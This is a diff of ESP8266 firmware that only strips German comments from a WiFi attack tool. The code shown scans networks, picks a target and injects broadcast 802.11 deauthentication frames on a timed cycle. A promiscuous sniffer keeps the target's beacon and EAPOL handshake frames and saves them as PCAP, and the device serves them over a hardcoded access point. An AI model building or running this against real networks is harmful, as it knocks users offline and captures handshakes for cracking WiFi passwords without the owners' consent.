@@ -4,11 +4,9 @@
 
 extern "C" {
   #include "user_interface.h"
-  // Deklaration der nativen ESP8266 SDK-Injektionsfunktion
   int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
 }
 
-// Manuelle Definition der rx_control Struktur für alte Core-Versionen (z.B. v2.0.0)
 struct rx_control {
     signed rssi : 8;
     unsigned rate : 4;
@@ -36,7 +34,6 @@ struct rx_control {
     unsigned : 12;
 };
 
-// PCAP-Strukturen für Wireshark-Kompatibilität
 typedef struct {
   uint32_t magic_number;
   uint16_t version_major;
@@ -54,7 +51,6 @@ typedef struct {
   uint32_t orig_len;
 } __attribute__((packed)) pcap_record_header_t;
 
-// Netzwerk-Struktur
 typedef struct {
   String ssid;
   uint8_t bssid[6];
@@ -63,7 +59,6 @@ typedef struct {
   String encryption;
 } WiFiNetwork;
 
-// Globale Variablen
 WiFiNetwork networks[20];
 WiFiNetwork target;
 uint8_t* pcap_buffer = nullptr;
@@ -75,7 +70,6 @@ bool with_deauth = false;
 bool is_capturing = false;
 uint16_t global_seq = 0;
 
-// Variablen für das 5s AN / 10s AUS Deauth-Intervall
 unsigned long deauth_state_timer = 0;
 bool deauth_active_phase = true; 
 
@@ -83,7 +77,6 @@ ESP8266WebServer server(80);
 const char* ap_ssid = "HandshakeCapture";
 const char* ap_password = "capture123";
 
-// Das Paket-Template nach ESP8266-Vorgabe (26 Bytes)
 uint8_t injection_packet[26] = {
     0xC0, 0x00, 0x3A, 0x01,
     0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
@@ -93,7 +86,6 @@ uint8_t injection_packet[26] = {
     0x07, 0x00                          // Reason
 };
 
-// Funktionsprototypen
 void scanNetworks();
 void listNetworks();
 void selectTarget();
@@ -145,7 +137,6 @@ void setup() {
 void loop() {
   server.handleClient();
   
-  // FIX: Verhindert "Aufnahme läuft bereits"-Schleifen durch radikales Buffer-Leeren
   if (Serial.available()) {
     String input = Serial.readStringUntil('\n');
     input.trim();
@@ -166,7 +157,6 @@ void loop() {
     }
   }
 
-  // Intervall-Steuerung (5s AN, 10s AUS)
   if (is_capturing && with_deauth) {
     unsigned long current_time = millis();
     
@@ -352,14 +342,12 @@ void saveHandshake() {
   pcap_size = 0;
 }
 
-// FIX: Robuste Offset-Filterung für EAPOL- und QoS-Datenframes (0x88)
 void promiscuousRxCallback(uint8_t* buf, uint16_t len) {
   if (!is_capturing) return;
 
   uint8_t* payload;
   uint16_t packet_len;
 
-  // Prüfe die typischen ESP8266-Sniffer-Buffer-Längen, um die rx_control-Struktur sauber abzuziehen
   if (len == 128 || len == 60 || len == 120 || len == 64) { 
     struct rx_control *rx_ctrl = (struct rx_control *)buf;
     payload = buf + sizeof(struct rx_control);
@@ -373,7 +361,6 @@ void promiscuousRxCallback(uint8_t* buf, uint16_t len) {
 
   uint8_t frame_type = payload[0];
 
-  // 1. Beacon-Filter (Offset 10)
   if (frame_type == 0x80 && !beacon_captured) {
     if (memcmp(&payload[10], target.bssid, 6) == 0) {
       Serial.println("[Sniffer] Beacon Frame gesichert!");
@@ -383,11 +370,9 @@ void promiscuousRxCallback(uint8_t* buf, uint16_t len) {
     return;
   }
 
-  // 2. EAPOL-Filter (Unterstützt Standard-Daten 0x08 und QoS-Daten 0x88)
   if (frame_type == 0x08 || frame_type == 0x88) {
     if (memcmp(&payload[4], target.bssid, 6) == 0 || memcmp(&payload[10], target.bssid, 6) == 0) {
       
-      // QoS Data Frames verschieben den Ethertype-Header um genau 2 Bytes nach hinten
       uint8_t llc_offset = (frame_type == 0x88) ? 32 : 30; 
       
       uint16_t ethertype = (payload[llc_offset] << 8) | payload[llc_offset + 1];
